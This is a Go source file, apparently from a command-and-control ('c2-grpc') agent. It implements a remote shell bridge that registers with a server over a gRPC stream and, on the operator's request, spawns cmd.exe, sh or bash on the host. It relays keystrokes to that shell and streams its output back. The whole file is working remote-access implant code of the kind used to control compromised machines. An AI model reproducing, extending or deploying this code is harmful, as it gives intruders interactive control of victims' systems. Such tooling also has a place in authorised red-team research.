package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"syscall"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/creack/pty"
)

func startShellBridge(ctx context.Context, cancel context.CancelCauseFunc, client pb.ShellServiceClient, agentID string) {
	stream, err := client.AgentShell(ctx)
	if err != nil {
		cancel(fmt.Errorf("server connection lost: shell stream error: %w", err))
		return
	}

	sendMu := &sync.Mutex{}
	sendEvent := func(event *pb.AgentShellEvent) error {
		sendMu.Lock()
		defer sendMu.Unlock()
		return stream.Send(event)
	}

	if err := sendEvent(&pb.AgentShellEvent{
		Type:    "register",
		AgentId: agentID,
	}); err != nil {
		cancel(fmt.Errorf("server connection lost: shell register error: %w", err))
		return
	}

	sessions := make(map[string]*shellSession)
	var sessionsMu sync.Mutex

	closeSession := func(sessionID, message string) {
		sessionsMu.Lock()
		session, ok := sessions[sessionID]
		if ok {
			delete(sessions, sessionID)
		}
		sessionsMu.Unlock()
		if !ok {
			return
		}

		if session.ptmx != nil {
			_ = session.ptmx.Close()
		}
		if session.stdin != nil {
			_ = session.stdin.Close()
		}
		if session.stdout != nil {
			_ = session.stdout.Close()
		}
		if session.cmd.Process != nil {
			_ = session.cmd.Process.Kill()
		}
		_ = sendEvent(&pb.AgentShellEvent{
			Type:      "closed",
			SessionId: sessionID,
			AgentId:   agentID,
			Message:   message,
		})
	}

	defer func() {
		sessionsMu.Lock()
		ids := make([]string, 0, len(sessions))
		for sessionID := range sessions {
			ids = append(ids, sessionID)
		}
		sessionsMu.Unlock()
		for _, sessionID := range ids {
			closeSession(sessionID, "shell bridge closed")
		}
	}()

	for {
		req, err := stream.Recv()
		if err == io.EOF || ctx.Err() != nil {
			return
		}
		if err != nil {
			cancel(fmt.Errorf("server connection lost: shell recv error: %w", err))
			return
		}

		switch req.GetType() {
		case "open":
			shellCmd := exec.Command(defaultShell())
			session, err := openShellSession(shellCmd, req.GetCols(), req.GetRows())
			if err != nil {
				_ = sendEvent(&pb.AgentShellEvent{
					Type:      "open_error",
					SessionId: req.GetSessionId(),
					AgentId:   agentID,
					Message:   err.Error(),
				})
				continue
			}
			sessionsMu.Lock()
			sessions[req.GetSessionId()] = session
			sessionsMu.Unlock()

			_ = sendEvent(&pb.AgentShellEvent{
				Type:      "open_ok",
				SessionId: req.GetSessionId(),
				AgentId:   agentID,
			})

			go func(sessionID string, session *shellSession) {
				defer closeSession(sessionID, "shell closed")

				buf := make([]byte, 1024)
				reader := shellSessionReader(session)
				for {
					n, err := reader.Read(buf)
					if n > 0 {
						if sendErr := sendEvent(&pb.AgentShellEvent{
							Type:      "output",
							SessionId: sessionID,
							AgentId:   agentID,
							Data:      string(buf[:n]),
						}); sendErr != nil {
							return
						}
					}
					if err != nil {
						if err == io.EOF || errors.Is(err, syscall.EIO) {
							break
						}
						_ = sendEvent(&pb.AgentShellEvent{
							Type:      "output",
							SessionId: sessionID,
							AgentId:   agentID,
							Data:      fmt.Sprintf("\nShell read error: %v\n", err),
						})
						break
					}
				}

				_ = session.cmd.Wait()
			}(req.GetSessionId(), session)
		case "input":
			sessionsMu.Lock()
			session, ok := sessions[req.GetSessionId()]
			sessionsMu.Unlock()
			if ok {
				inputData := req.GetData()
				if runtime.GOOS == "windows" && session.ptmx == nil {
					inputData = normalizeWindowsShellInput(inputData)
				}
				_, _ = shellSessionWriter(session).Write([]byte(inputData))
			}
		case "resize":
			sessionsMu.Lock()
			session, ok := sessions[req.GetSessionId()]
			sessionsMu.Unlock()
			if ok && session.ptmx != nil {
				_ = pty.Setsize(session.ptmx, &pty.Winsize{
					Cols: uint16(maxInt32(req.GetCols(), 80)),
					Rows: uint16(maxInt32(req.GetRows(), 24)),
				})
			}
		case "close":
			closeSession(req.GetSessionId(), "shell closed by operator")
		}
	}
}

func openShellSession(cmd *exec.Cmd, cols, rows int32) (*shellSession, error) {
	if runtime.GOOS == "windows" {
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			return nil, err
		}
		cmd.Stderr = cmd.Stdout
		stdin, err := cmd.StdinPipe()
		if err != nil {
			return nil, err
		}
		if err := cmd.Start(); err != nil {
			_ = stdin.Close()
			_ = stdout.Close()
			return nil, err
		}
		return &shellSession{
			cmd:    cmd,
			stdin:  stdin,
			stdout: stdout,
		}, nil
	}

	size := &pty.Winsize{
		Cols: uint16(maxInt32(cols, 80)),
		Rows: uint16(maxInt32(rows, 24)),
	}
	ptmx, err := pty.StartWithSize(cmd, size)
	if err != nil {
		return nil, err
	}
	return &shellSession{cmd: cmd, ptmx: ptmx}, nil
}

func shellSessionReader(session *shellSession) io.Reader {
	if session.ptmx != nil {
		return session.ptmx
	}
	return session.stdout
}

func shellSessionWriter(session *shellSession) io.Writer {
	if session.ptmx != nil {
		return session.ptmx
	}
	return session.stdin
}

func normalizeWindowsShellInput(s string) string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	s = strings.ReplaceAll(s, "\r", "\n")
	s = strings.ReplaceAll(s, "\n", "\r\n")
	return s
}

func defaultShell() string {
	if runtime.GOOS == "windows" {
		return "cmd.exe"
	}
	if runtime.GOOS == "linux" {
		if _, err := exec.LookPath("sh"); err == nil {
			return "sh"
		}
		if _, err := exec.LookPath("bash"); err == nil {
			return "bash"
		}
	}
	if shell := os.Getenv("SHELL"); shell != "" {
		return shell
	}
	return "sh"
}

func maxInt32(v, fallback int32) int32 {
	if v <= 0 {
		return fallback
	}
	return v
}
